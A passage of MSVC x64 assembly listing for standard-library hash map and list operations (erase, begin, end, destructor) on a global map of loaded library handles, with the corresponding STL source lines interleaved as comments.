; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rdx]
$LN21@erase:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	esi, esi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdi, -3750763034362895579		; cbf29ce484222325H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	ecx, esi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN32@erase
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	3
$LL155@erase:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rcx]
	inc	rcx
	xor	rdi, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdi, r10
	cmp	rcx, r9
	jb	SHORT $LL155@erase
$LN32@erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1109 :             const auto _Target = _Find_last(_Keyval, _Hashval)._Duplicate;

	mov	r8, rdx
	mov	r9, rdi
	lea	rdx, QWORD PTR $T1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	mov	rbx, QWORD PTR [rax+8]

; 1110 :             if (_Target) {

	test	rbx, rbx
	je	$LN5@erase

; 1111 :                 _Erase_bucket(_Target, _Hashval & _Mask);

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48
	and	rdx, rdi

; 1663 :         _Nodeptr& _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	shl	rdx, 4
	add	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24

; 1664 :         _Nodeptr& _Bucket_hi = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;
; 1665 :         if (_Bucket_hi == _Plist) {

	mov	rax, QWORD PTR [rdx]
	cmp	QWORD PTR [rdx+8], rbx
	jne	SHORT $LN37@erase

; 1666 :             if (_Bucket_lo == _Plist) { // make bucket empty

	cmp	rax, rbx
	jne	SHORT $LN39@erase

; 1667 :                 const auto _End = _List._Mypair._Myval2._Myhead;

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8

; 1668 : 
; 1669 :                 _Bucket_lo = _End;

	mov	QWORD PTR [rdx], rax

; 1673 :             }

	mov	QWORD PTR [rdx+8], rax
	jmp	SHORT $LN41@erase
$LN39@erase:

; 1670 :                 _Bucket_hi = _End;
; 1671 :             } else {
; 1672 :                 _Bucket_hi = _Plist->_Prev; // move end back one element

	mov	rax, QWORD PTR [rbx+8]

; 1673 :             }

	mov	QWORD PTR [rdx+8], rax
	jmp	SHORT $LN41@erase
$LN37@erase:

; 1674 :         } else if (_Bucket_lo == _Plist) {

	cmp	rax, rbx
	jne	SHORT $LN41@erase

; 1675 :             _Bucket_lo = _Plist->_Next; // move beginning up one element

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rdx], rax
$LN41@erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1423 :         const auto _Result = _Pnode->_Next;

	mov	rcx, QWORD PTR [rbx]

; 1424 :         _Mypair._Myval2._Orphan_ptr2(_Pnode);
; 1425 :         --_Mypair._Myval2._Mysize;

	dec	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1426 :         _Pnode->_Prev->_Next = _Result;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rax], rcx

; 1427 :         _Result->_Prev       = _Pnode->_Prev;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rcx+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN81@erase
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN95@erase

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN92@erase

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN95@erase:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN81@erase:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], sil
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1113 :                 return 1;

	mov	esi, 1
$LN5@erase:

; 1137 :     }

	mov	rbx, QWORD PTR [rsp+64]
	mov	rax, rsi
	mov	rsi, QWORD PTR [rsp+80]
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
$LN92@erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN168@erase:
?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::erase
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Unchecked_end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?_Unchecked_end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_end, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR [rdx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 808  :         return _List._Unchecked_end();

	mov	rax, rdx

; 809  :     }

	ret	0
?_Unchecked_end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Unchecked_begin@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$dead$ = 8
__$ReturnUdt$ = 16
?_Unchecked_begin@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_begin, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	rcx, QWORD PTR [rax]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 800  :         return _List._Unchecked_begin();

	mov	rax, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rdx], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 801  :     }

	ret	0
?_Unchecked_begin@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$dead$ = 8
__$ReturnUdt$ = 16
?end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::end, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	QWORD PTR [rdx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 792  :         return _List.end();

	mov	rax, rdx

; 793  :     }

	ret	0
?end@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >, COMDAT

; 1047 :     ~list() noexcept {

$LN55:
	push	rbx
	sub	rsp, 32					; 00000020H

; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

	mov	rdx, QWORD PTR [rcx]

; 1047 :     ~list() noexcept {

	mov	rbx, rcx

; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

